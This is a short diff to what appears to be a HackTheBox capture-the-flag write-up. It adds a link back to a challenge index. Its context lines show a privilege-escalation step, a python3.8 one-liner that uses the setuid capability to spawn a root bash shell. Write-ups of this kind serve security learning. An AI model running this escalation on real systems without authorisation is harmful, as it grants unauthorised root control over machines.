@@ -28,3 +28,5 @@ We will exploit the setuid capability to spawn a root shell.
 python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 And we are root!
+
+📁 **[Back to HackTheBox Challenges](../README.md)**
